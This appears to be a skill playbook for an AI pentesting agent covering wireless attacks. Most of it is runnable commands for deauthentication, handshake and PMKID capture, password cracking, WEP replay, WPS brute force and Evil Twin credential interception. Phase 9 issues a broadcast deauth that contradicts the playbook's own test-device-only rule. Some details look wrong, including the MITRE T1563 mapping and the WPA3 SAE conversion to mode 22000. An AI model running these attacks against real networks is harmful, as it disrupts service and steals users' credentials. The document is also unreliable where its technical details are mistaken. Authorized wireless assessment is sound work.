---
skill: wireless-pentesting-deep-aggressive
mitre_attack_id: T1563
owasp_mapping: []
difficulty: advanced
tags: [wireless, wifi, wpa2, wpa3, wep, pmkid, handshake-capture, deauth, evil-twin, rogue-ap, monitor-mode, hashcat, wps, pixie-dust, bettercap, deep-aggressive-mode]
---
## Summary
Deep Aggressive Mode wireless penetration testing. Executes the complete authorized wireless attack chain: monitor-mode setup, extended passive reconnaissance, 4-way handshake and PMKID capture, deauthentication-forced reconnection, WEP/WPA2/WPA3 cracking with hashcat, WPS PIN and Pixie Dust attacks, and Evil Twin / rogue AP assessment in isolated environments. Every phase is gated by regulatory compliance and RoE authorization; destructive or disruptive actions against production wireless are prohibited.

Skill library references:
- skills/network-security/host-discovery.md
- Metasploit auxiliary/scanner/wifi module set (referenced at runtime)

## Phase 0 — Regulatory & RoE Compliance
1. **Regulatory Check** — Verify the regulatory domain (FCC/ETSI/other) and confirm wireless testing authorization. Deauthentication, WPS PIN brute-force, and Evil Twin require explicit authorization.
2. **Physical Assessment** — Survey the physical testing area. Identify neighboring networks, interference sources, and optimal antenna positioning.
3. **Equipment Configuration** — Configure wireless adapter in monitor mode. Verify the chipset supports packet injection.
4. **Adapter Prep** — `sudo airmon-ng check kill; sudo airmon-ng start wlan0; sudo iwconfig wlan0mon`
5. **Test-Device Only** — Confirm any deauth targets are your own test devices or a Faraday-shielded test environment.

## Phase 1 — Extended Passive Reconnaissance
1. **Kismet** — Run for comprehensive wireless network discovery:
   - Beacon frame collection (SSID, BSSID, channel, encryption, signal)
   - Client probe request monitoring
   - Hidden network detection
   - GPS coordinate logging for wardriving (if applicable)
   ```bash
   sudo kismet -c wlan0mon
   ```
2. **airodump-ng** — Channel-hop discovery and target selection:
   ```bash
   sudo airodump-ng wlan0mon
   sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
   ```
3. **bettercap** — WiFi recon module for client and AP inventory:
   ```bash
   sudo bettercap -iface wlan0mon
   > wifi.recon on
   > wifi.show
   > wifi.assoc
   ```
4. **Network Classification** — Classify discovered networks by encryption, signal strength, and client count. Identify the target network(s). Confirm target by beacon frame containing the SSID (probe response alone is insufficient).

## Phase 2 — Handshake Capture
1. **Passive Capture** — Begin `airodump-ng` capture on the target channel and BSSID; a client reconnect or new association yields the 4-way handshake without transmitting.
2. **Deauth-Forced Reconnection (Authorized Only)** — Send deauthentication to force client reconnection:
   ```bash
   sudo aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
   # broadcast deauth variant
   sudo aireplay-ng -0 5 -a <BSSID> wlan0mon
   ```
3. **Handshake Verification** — Confirm all four EAPOL packets present in Wireshark, or `aircrack-ng capture-01.cap` reports the handshake, before cracking.
4. **Conversion** — Convert capture to hashcat format:
   ```bash
   hcxpcapngtool capture.pcapng -o handshake.hc22000
   hcxpmktool capture.pcapng -o pmkid.hc16800
   ```

## Phase 3 — PMKID Capture
```bash
# Target only the target AP
sudo hcxdumptool -i wlan0mon -o capture.pcapng --filterlist_ap=<BSSID> --filtermode=2
# Convert PMKID (mode 16800) and handshake (mode 22000)
hcxpmktool capture.pcapng -o pmkid.hc16800
hcxpcapngtool capture.pcapng -o handshake.hc22000
```
PMKID requires no client and works against the AP itself; capture before relying on handshake-only paths.

## Phase 4 — WPA2/WPA3 Cracking (hashcat)
```bash
# WPA2/WPA3 SAE handshake (mode 22000)
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 handshake.hc22000 wordlist.txt --rules best64.rule
# PMKID (mode 16800)
hashcat -m 16800 pmkid.hc16800 /usr/share/wordlists/rockyou.txt
# aircrack-ng fallback
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```
A cracked PSK must be re-authenticated against a simulated AP (or the live target when authorized) before reporting.

## Phase 5 — WEP Attacks
```bash
# Fake authentication
sudo aireplay-ng -1 0 -a <BSSID> -h <ASSOC_MAC> wlan0mon
# ARP replay to generate IVs
sudo aireplay-ng -3 -b <BSSID> -h <ASSOC_MAC> wlan0mon
# Crack once 5000+ IVs captured
aircrack-ng -b <BSSID> capture-01.cap
```

## Phase 6 — WPS Assessment
```bash
# Identify WPS-enabled APs and lock status
wash -i wlan0mon
# PIN brute-force (authorized, lockout-aware)
sudo reaver -i wlan0mon -b <BSSID> -vv
# Pixie Dust for vulnerable implementations
sudo reaver -i wlan0mon -b <BSSID> -K 1
```
Verify AP lock status before and after testing; a locked AP is not vulnerable to WPS brute-force.

## Phase 7 — Evil Twin / Rogue AP (Isolated Environment Only)
```bash
# airbase-ng rogue AP with target SSID
sudo airbase-ng -e "<target_ssid>" -c <channel> wlan0mon
# bettercap rogue AP + client deauth capture
sudo bettercap -iface wlan0mon
> set arp.spoof.targets <client>
> wifi.ap.ssid "<target_ssid>"
> wifi.ap
> wifi.deauth <client>
# Intercept EAP / HTTP pre-TLS credentials; hand off to creed-creds-agent
```
Evil Twin is prohibited in production; isolated/Faraday environments only.

## Phase 8 — WPA3 / EAP-Enterprise Assessment
1. **WPA3 SAE handshake capture** — Same capture workflow; SAE hash converts to mode 22000.
2. **Downgrade surface** — Check for WPA3 transition mode exposing WPA2-PSK fallback; test for dragonblood-class weaknesses (CVE-2019-13377 side-channel, downgrade).
3. **EAP Analysis** — Capture EAP handshake and identify EAP method (EAP-TLS, EAP-TTLS, EAP-PEAP, EAP-FAST).
4. **RADIUS Server Discovery** — Identify RADIUS server details from EAP packets.
5. **Enterprise Credential Capture** — Evil Twin (isolated) against EAP-PEAP/EAP-TTLS to capture MSCHAPv2 credentials; crack with hashcat mode 5500 (or asleap).

## Phase 9 — Client & Rogue AP Detection
```bash
# bettercap deauth + probe for hidden/rogue APs
sudo bettercap -iface wlan0mon
> wifi.deauth.all
> wifi.ap.handshakes
# Compare discovered BSSIDs against authorized AP list (compliance-audit-agent)
```
Rogue AP discovery triggers a priority notification to the orchestrator.

## Phase 10 — Bluetooth/BLE Assessment (Optional)
```bash
sudo hcitool scan
sudo bluetoothctl scan on
sudo gatttool -b <BT_MAC> --primary        # BLE service enumeration
sudo gatttool -b <BT_MAC> --characteristics
```
Check for legacy pairing, weak PINs, and unencrypted connections. Requires explicit authorization.

## Phase 11 — Consolidation, Verification, Handoff
Verification checklist (sandbox):
- [ ] Every network confirmed by beacon frame containing the SSID
- [ ] Handshake verified: all four EAPOL packets present or hashcat confirms valid hash
- [ ] PMKID hash validates in mode 16800
- [ ] Cracked PSK re-authenticated before reporting
- [ ] WPS lock status checked before and after testing
- [ ] Deauth only sent to own test devices or Faraday-isolated environment
- [ ] Every active probe logged with timestamp, channel, signal strength, duration
- [ ] Output in YAML with wireless_type, encryption, vulnerability_type, evidence_path, confidence

Handoff:
- Wireless inventory and handshake/PMKID hashes to recon-agent
- Captured hashes to creed-creds-agent / password-credential-agent for cracking
- Cracked-credential findings to network-expert-agent
- Compliance findings (rogue APs, weak configs) to compliance-audit-agent
- Full audit log to audit-agent

## References
- Skill library: skills/network-security/host-discovery.md
- MITRE ATT&CK T1563 (Hijack or Intercept Wireless Communication): https://attack.mitre.org/techniques/T1563/
- MITRE ATT&CK T1557 (Adversary-in-the-Middle): https://attack.mitre.org/techniques/T1557/
- aircrack-ng: https://www.aircrack-ng.org/
- hcxtools: https://github.com/ZerBea/hcxtools
- hashcat: https://hashcat.net/hashcat/
- reaver: https://github.com/t6x/reaver-wps-fork-t6x
- bettercap: https://www.bettercap.org/

Prohibited: deauth against non-test clients, Evil Twin in production, channel/beacon flooding, association table exhaustion, WPS brute-force against locked APs, BLE jamming, any transmission beyond RoE spectrum authorization.
